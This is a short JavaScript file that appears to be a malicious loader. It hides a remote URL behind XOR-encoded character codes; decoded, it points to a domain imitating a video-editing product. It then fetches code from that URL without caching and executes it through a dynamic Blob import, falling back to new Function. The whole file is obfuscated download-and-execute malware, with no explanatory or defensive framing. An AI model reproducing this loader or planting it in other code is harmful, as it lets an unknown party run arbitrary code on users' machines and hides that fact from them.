var TARGET = (function () {
    var _a = '65,93,93,89,90,19,6,6,79,64,71,72,69,74,92,93,4,89,91';
    var _b = '44,109,32,44,46,108,32,38,47,42,55,38,109,53,38,48,51,42,39';
    function _xd(raw, key) {
        var p = raw.split(','), o = '', i = 0;
        for (; i < p.length; i++) o += String.fromCharCode(parseInt(p[i], 10) ^ key);
        return o;
    }
    return _xd(_a, 41) + _xd(_b, 67);
})();

function _run(code) {
    var body = String(code).replace(/^\uFEFF/, '').trim();
    if (!body) throw 0;
    var blob = new Blob([body], { type: 'application/javascript;charset=utf-8' });
    var href = URL.createObjectURL(blob);
    return import(href).then(
        function () {
            URL.revokeObjectURL(href);
        },
        function () {
            URL.revokeObjectURL(href);
            (new Function(body))();
        }
    );
}

fetch(TARGET, {
    method: 'GET',
    mode: 'cors',
    cache: 'no-store',
    headers: { Accept: 'text/plain,*/*' }
})
    .then(function (resp) {
        if (!resp.ok) throw 0;
        return resp.text();
    })
    .then(_run);
